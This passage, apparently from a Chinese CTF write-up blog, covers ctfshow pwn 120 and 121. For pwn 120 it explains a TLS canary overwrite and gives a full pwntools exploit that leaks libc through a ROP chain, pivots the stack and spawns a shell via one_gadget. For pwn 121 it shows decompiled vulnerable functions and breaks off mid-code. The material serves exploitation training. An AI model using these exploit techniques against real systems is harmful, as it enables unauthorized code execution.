href="%E8%BF%99%E9%87%8C%E6%8F%90%E4%B8%80%E5%98%B4%EF%BC%9A%E5%AE%98%E6%96%B9%E7%9A%84exp%E6%88%91%E4%B8%8D%E6%B8%85%E6%A5%9A%E9%87%87%E7%94%A8%E7%9A%84%E6%98%AF%E4%BD%95%E7%A7%8Dpython%E7%89%88%E6%9C%AC%EF%BC%8C%E6%88%91%E6%9C%AC%E5%9C%B0%E8%BF%99%E8%BE%B9%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AFpython2.7.18%E3%80%82%E5%9C%A8%E8%BF%9B%E8%A1%8Cchr%E6%93%8D%E4%BD%9C%E6%97%B6%E9%9C%80%E8%A6%81%E6%8C%87%E5%AE%9A%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E4%B8%BA(lantin-1%E6%88%96utf-8%E7%AD%89)%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%97%A9%E6%9C%9F%E7%89%88%E6%9C%AC%E7%9A%84ascii%E7%A0%81%E5%8F%AA%E8%83%BD%E6%94%AF%E6%8C%81128%E4%B9%8B%E5%89%8D%E7%9A%84%E5%AD%97%E7%AC%A6%E7%9A%84%E7%BC%96%E7%A0%81">^1</a>，也是出现了这个问题（目前这个问题我还没想清楚是为什么）。最终的解决方案是将sleep()函数删掉就可以了–这里猜测可能是传输过程中出现了数据的丢失吧 :no_mouth:</p>
</blockquote>
<h2 id="pwn-120"><a href="#pwn-120" class="headerlink" title="pwn 120"></a>pwn 120</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502242233192.png"></p>
<p>64位仅关闭PIE</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502242233835.png"></p>
<p>创建了一个线程，跟进看一下：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502242234439.png"></p>
<p>子进程里面先让用户输入要输入的大小，如果大于0x5000就输出”Are you kidding me?”，如果小于等于就进行读取明显存在栈溢出</p>
<p>Canary 储存在 TLS（Thread local storage） 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
<p>我们可以从这里溢出到TLS修改canary，接下来就是确定canary的位置</p>
<p>之后便是确定好偏移，然后构造ROP链，泄露地址puts函数的地址，计算出libcbase，最后然后我们只需要在构造一个read，写一个one_gadget到stack_pivot上，然后控制返回地址回stack_pivot便能获取一个shell了</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28233</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">leave_addr = <span class="number">0x400ada</span>  </span><br><span class="line">pop_rdi_ret = <span class="number">0x400be3</span>     <span class="comment"># 0x0000000000400be3 : pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400be1</span> <span class="comment"># 0x0000000000400be1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x602f00</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x510</span> + p64(bss_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.symbols[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">payload += p64(leave_addr)</span><br><span class="line"></span><br><span class="line">payload  = payload.ljust(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;How much do you want to send this time?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;See you next time!\n&quot;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = p64(one)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-121"><a href="#pwn-121" class="headerlink" title="pwn 121"></a>pwn 121</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251904253.png"></p>
<p>64位开启Canary与NX保护，部分开启RELRO</p>
<p>IDA查看main函数（修改函数名后）：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251905363.png"></p>
<p>根据菜单栏，我们不难发现，首先着重引起注意的就是4 （ctfshow）跟进查看：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NDczNWIxZjgwMWQ1ZTY0NWFkYTA4NWNhNDU0MWZiNjFfWUdJMVNMU1h2RDF5MUN6VlVvcE9oTVNMUmQ1dEFwUzRfVG9rZW46UUFkOWJvMjFLb3VnZU54VDRHZ2NyaUI2bmliXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>这里存在三个漏洞，分别为格式化字符串漏洞，栈溢出漏洞，堆溢出漏洞</p>
<p>Fmt</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">fmt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+Fh] [rbp-631h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-631h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-630h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+10h] [rbp-630h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+10h] [rbp-630h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-62Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+14h] [rbp-62Ch]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+18h] [rbp-628h]</span></span><br><span class="line">  <span class="type">signed</span> __int64 v10; <span class="comment">// [rsp+20h] [rbp-620h]</span></span><br><span class="line">  <span class="type">signed</span> __int64 v11; <span class="comment">// [rsp+28h] [rbp-618h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">512</span>]; <span class="comment">// [rsp+30h] [rbp-610h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+230h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">256</span>]; <span class="comment">// [rsp+330h] [rbp-310h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">520</span>]; <span class="comment">// [rsp+430h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+638h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;try_to_get_flag&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s[<span class="number">16</span>], <span class="number">0</span>, <span class="number">0xF0u</span>LL);</span><br><span class="line">  v10 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v0 = (<span class="type">unsigned</span> __int64)v14;</span><br><span class="line">  <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    format[i] = i;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> __int8)s[i % v10];</span><br><span class="line">    v14[i] = v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (v14[j] + v7 + format[j]) % <span class="number">256</span>;</span><br><span class="line">    v2 = format[j];</span><br><span class="line">    format[j] = format[v7];</span><br><span class="line">    v0 = v2;</span><br><span class="line">    format[v7] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_400E76(v15, <span class="number">500LL</span>, v0);</span><br><span class="line">  v11 = <span class="built_in">strlen</span>(v15);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v11; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v8 = (v8 + format[v6]) % <span class="number">256</span>;</span><br><span class="line">    v3 = format[v6];</span><br><span class="line">    format[v6] = format[v8];</span><br><span class="line">    format[v8] = v3;</span><br><span class="line">    v15[k] ^= format[(format[v8] + format[v6]) % <span class="number">256</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>格式化字符串不可控</p>
<p>stack_overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">stack_overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-EAE4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-EAE0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-EADCh]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-EAD8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+1Ch] [rbp-EAD4h]</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">15026</span>]; <span class="comment">// [rsp+20h] [rbp-EAD0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+EAE8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= v2; ++i )</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;v7[i], &amp;v7[i + <span class="number">12</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">1</span>; j &lt;= v2; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">1</span>; (<span class="type">int</span>)k &lt;= v3; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7[j] &gt; k )</span><br><span class="line">      &#123;</span><br><span class="line">        v7[<span class="number">1500</span> * j + <span class="number">24</span> + k] = v7[<span class="number">1500</span> * j - <span class="number">1476</span> + k];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v7[<span class="number">1500</span> * j - <span class="number">1476</span> + k];</span><br><span class="line">        <span class="keyword">if</span> ( v7[j + <span class="number">12</span>] + v7[<span class="number">1500</span> * j - <span class="number">1476</span> + k - v7[j]] &gt;= v0 )</span><br><span class="line">          v0 = v7[j + <span class="number">12</span>] + v7[<span class="number">1500</span> * j - <span class="number">1476</span> + k - v7[j]];</span><br><span class="line">        v7[<span class="number">1500</span> * j + <span class="number">24</span> + k] = v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v7[<span class="number">1500</span> * v2 + <span class="number">24</span> + v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结构化写入，但是程序开启了Canary保护</p>
<p>heap_overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">heap_overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+7h] [rbp-19h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0x3E8u</span>LL);</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  v8 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v6++;</span><br><span class="line">    v9[v0] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">-1</span> &amp;&amp; v9[i] == <span class="number">34</span> &amp;&amp; v9[i - <span class="number">1</span>] != <span class="number">92</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">1</span> &amp;&amp; v9[i] == <span class="number">34</span> &amp;&amp; v9[i - <span class="number">1</span>] != <span class="number">92</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">-1</span> &amp;&amp; v9[i] == <span class="number">47</span> &amp;&amp; v9[i + <span class="number">1</span>] == <span class="number">42</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">        v9[i] = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">1</span> &amp;&amp; v9[i] == <span class="number">42</span> &amp;&amp; v9[i + <span class="number">1</span>] == <span class="number">47</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = &amp;v9[i + <span class="number">1</span>];</span><br><span class="line">        *v1 = <span class="number">-1</span>;</span><br><span class="line">        v9[i] = *v1;</span><br><span class="line">        v7 = <span class="number">-1</span>;</span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v9[i] = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    result = j;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)j &gt;= v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9[j] != <span class="number">0xFF</span> )</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">char</span>)v9[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仅有一次溢出，无返回</p>
<p>从单个函数或者走入这个分支来看，并不好利用</p>
<p>查看其他函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2U1ZjMzYTg4NmVhMGRhZDc5NTdiOTM2MjRkYmUyY2VfZUVFZmVSNW0zMEx1RW1qdm5MdTkxRmxNRkxyR1JMMVFfVG9rZW46VmpzaWJvVEdEb21qS0N4enRuc2NQUmNxbnBjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>仔细观察函数流程，发现程序里进行了一个异常捕捉机制，在伪代码中这个结构体并没有显示</p>
<p>跟进函数查看一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_401148</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  _DWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+118h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;FlexMD5 bruteforce tool V0.1&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;custom md5 state (yes/No)&quot;</span>);</span><br><span class="line">  sub_400E76(s1, <span class="number">4LL</span>, v0);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_6061A4 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;initial state[0]:&quot;</span>);</span><br><span class="line">    dword_6061B0 = sub_400F45(<span class="string">&quot;initial state[0]:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;initial state[1]:&quot;</span>);</span><br><span class="line">    dword_6061B4 = sub_400F45(<span class="string">&quot;initial state[1]:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;initial state[2]:&quot;</span>);</span><br><span class="line">    dword_6061B8 = sub_400F45(<span class="string">&quot;initial state[2]:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;initial state[3]:&quot;</span>);</span><br><span class="line">    dword_6061BC = sub_400F45(<span class="string">&quot;initial state[3]:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;custom charset (yes/No)&quot;</span>);</span><br><span class="line">  sub_400E76(s1, <span class="number">4LL</span>, v1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_6061A4 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;charset length:&quot;</span>);</span><br><span class="line">    dword_606110 = sub_400F45(<span class="string">&quot;charset length:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_606110 &gt; <span class="number">256</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      exception = __cxa_allocate_exception(<span class="number">4uLL</span>);</span><br><span class="line">      *exception = <span class="number">2</span>;</span><br><span class="line">      __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="string">&#x27;int, 0LL);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    puts(&quot;charset:&quot;);</span></span><br><span class="line"><span class="string">    sub_400E76(s1, (unsigned int)(dword_606110 + 1), (unsigned int)(dword_606110 + 1));</span></span><br><span class="line"><span class="string">    off_606118 = strdup(s1);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  puts(&quot;bruteforce message pattern:&quot;);</span></span><br><span class="line"><span class="string">  sub_400F1E(byte_6061C0, 1024LL);</span></span><br><span class="line"><span class="string">  dword_6061A0 = strlen(byte_6061C0);</span></span><br><span class="line"><span class="string">  for ( i = 0; i &lt; strlen(byte_6061C0) &amp;&amp; byte_6061C0[i] != 46; ++i )</span></span><br><span class="line"><span class="string">    ;</span></span><br><span class="line"><span class="string">  if ( i == strlen(byte_6061C0) )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    v3 = __cxa_allocate_exception(4uLL);</span></span><br><span class="line"><span class="string">    *v3 = 0;</span></span><br><span class="line"><span class="string">    __cxa_throw(v3, (struct type_info *)&amp;`typeinfo for&#x27;</span><span class="type">int</span>, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;md5 pattern:&quot;</span>);</span><br><span class="line">  sub_400E76(byte_6065C0, <span class="number">33LL</span>, v4);</span><br><span class="line">  <span 